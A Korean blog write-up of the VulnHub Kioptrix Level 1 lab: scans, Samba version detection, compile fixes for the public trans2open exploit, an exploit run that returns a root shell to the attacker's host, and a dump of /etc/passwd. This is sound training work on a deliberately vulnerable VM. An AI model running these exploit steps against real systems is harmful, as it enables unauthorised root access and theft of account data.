---
title: Kioptrix Level 1
date: 2026-06-18 00:00:00 +0900
categories:
- Exploit Dev
tags: []
author: mmamm4
---

# Kioptrix Level 1

## 환경

VulnHub Kioptrix Level 1. Host-only 네트워크에서 Kali(`192.168.77.30`) → 타겟(`192.168.77.31`)으로 진행했습니다.

---

## 1. 정찰

타겟 IP는 서브넷 스윕으로 찾았습니다. `.31`이 VMware OUI(`00:0C:29:...`)를 달고 있어 바로 특정됐습니다.

포트 스캔은 `-p-`를 붙여 전체 포트를 대상으로 했습니다. 처음에 빠진다고 `-p-` 없이 돌리면 높은 포트 서비스를 통째로 놓칩니다. 실제로 이번에도 1024/tcp가 여기서만 나왔습니다.

```bash
sudo nmap -sV -sC -p- 192.168.77.31
```

```
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd
443/tcp  open  ssl/https   Apache/1.3.20 mod_ssl/2.8.4
1024/tcp open  status      1 (RPC #100024)
```

눈에 들어온 것이 두 가지였습니다. 웹 쪽 `mod_ssl/2.8.4`와 139에 올라있는 Samba. 문제는 nmap이 Samba 버전을 못 읽어왔다는 겁니다.

`smbclient -L`로 배너를 직접 보려고 했는데 이렇게 나왔습니다.

```bash
smbclient -L //192.168.77.31 -N
```

```
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes'
and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
```

접속은 됐는데 버전 문자열이 없었습니다. Kali smbclient가 SMB 협상 단계에서 EXTENDED_SECURITY를 먼저 시도하고 구버전 Samba가 이를 지원하지 않으니 배너가 안 나오는 거 같았습니다. Metasploit auxiliary 스캐너(`smb_version`)를 쓰면 된다고 해서 시도했습니다. exploit 모듈이 아니라 탐지 전용입니다.

```bash
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.77.31; run; exit"
```

```
[*] 192.168.77.31:139  - Host could not be identified: Unix (Samba 2.2.1a)
```

`Samba 2.2.1a`. 이걸로 두 버전 문자열을 모두 확보했습니다.

---

## 2. 취약점 탐색

```bash
searchsploit mod_ssl 2.8
searchsploit samba 2.2
```

```
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck | unix/remote/764.c

Samba < 2.2.8 (Linux/BSD) - Remote Code Ex | multiple/remote/10.c
Samba 2.2.x - 'call_trans2open' Remote Buf | unix/remote/22468.c
...
```

mod_ssl 쪽은 `47080.c`(OpenFuck, CVE-2002-0082), Samba 쪽은 `10.c`(trans2open, CVE-2003-0201, `Samba < 2.2.8 Linux/BSD`)가 맞았습니다. 우리 버전이 2.2.1a라 `< 2.2.8` 조건에 딱 걸립니다.

이번 세션은 Samba 경로를 먼저 탔습니다. `47080.c`는 외부 의존성 때문에 컴파일 전 준비가 한 단계 더 필요한데, 일단 더 단순한 쪽부터 끝내고 싶었습니다.

---

## 3. 익스플로잇 (Samba trans2open)

```bash
searchsploit -m multiple/remote/10.c
gcc -o exploit10 10.c
```

그냥 되면 좋겠지만 에러가 세 개 쏟아졌습니다.

```
10.c:190:6: error: conflicting types for 'usage'; have 'void(char *)'
  190 | void usage(char *prog)
10.c:179:6: note: previous declaration of 'usage' with type 'void(void)'
  179 | void usage();
10.c:485:6: error: conflicting types for 'shell'; have 'void(int)'
  485 | void shell(int sock)
10.c:178:6: note: previous declaration of 'shell' with type 'void(void)'
  178 | void shell();
10.c:1038:25: error: passing argument 2 of 'signal' from incompatible pointer type
  1038 |         signal(SIGUSR1, handler);
```

전부 2002년 당시 구버전 gcc 기준으로 작성된 타입 선언 문제였습니다. `void usage()`로 선언했는데 정의에서는 `void usage(char *)`로 인자가 붙는 식입니다. 로직은 건드릴 게 없고 선언부 세 줄만 맞춰주면 됐습니다.

```bash
sed -i 's/void usage();/void usage(char *);/' 10.c
sed -i 's/void shell();/void shell(int);/' 10.c
sed -i 's/void handler()/void handler(int sig)/' 10.c
gcc -o exploit10 10.c
```

실행 전에 `-t 0`으로 타겟 프리셋 목록을 봤습니다. nmap 배너가 `(Red-Hat/Linux)`였고 Apache 1.3.20 + OpenSSH 2.9p2 조합이 Red Hat 7.x 시대라 `06. samba-2.2.x - Redhat 7.x [0xbffff310]`을 골랐습니다.

```bash
./exploit10 -b 0 -c 192.168.77.30 -t 6 192.168.77.31
```

```
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Worked!
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
```

privesc 없이 바로 root였습니다. smbd가 root 권한으로 떠 있으니 그 프로세스를 터뜨리면 그대로 root 셸이 나옵니다. 서비스 실행 권한이 왜 중요한지 숫자로 보여주는 케이스입니다.

---

## 4. 수집

```
hostname  : kioptrix.level1
kernel    : Linux 2.4.7-10 (2001-09-06)
uid       : uid=0(root) gid=0(root)
```

`/etc/passwd`를 확인했습니다.

```
root:x:0:0:root:/root:/bin/bash
...
john:x:500:500::/home/john:/bin/bash
harold:x:501:501::/home/harold:/bin/bash
```

일반 계정은 `john`(uid=500), `harold`(uid=501) 두 개였습니다. 실전이라면 홈 디렉터리와 `/root`를 뒤졌겠지만 이번 목표는 root 획득이라 여기서 마무리했습니다.

---

## 5. 다음 — 경로 B (mod_ssl / OpenFuck)

`mod_ssl/2.8.4`에도 CVE-2002-0082가 있습니다. `47080.c`로 웹 경로를 통한 두 번째 침투를 다음 세션에 진행할 예정입니다. 같은 박스를 다른 경로로 한 번 더 뚫는 게 목표입니다.

---

## 메모

smbclient 배너가 안 나오는 건 처음 겪었습니다. 접속은 됐는데 버전이 없으니 순간 당황했고, 구버전 Samba는 탐지 방법을 따로 알아둬야겠다는 생각이 들었습니다. 컴파일 에러도 마찬가지인데, 에러 메시지를 보니까 전부 타입 선언 불일치라 로직은 멀쩡했습니다. 오래된 익스플로잇 코드를 건드릴 때는 일단 에러가 어느 계층 문제인지 먼저 보는 게 맞겠다 싶었습니다.

## 다음 단계

- [ ] 경로 B: mod_ssl 2.8.4 → OpenFuck (47080.c) 컴파일·실행
- [ ] Kioptrix Level 2 (웹 기반 진입 → 다른 privesc)
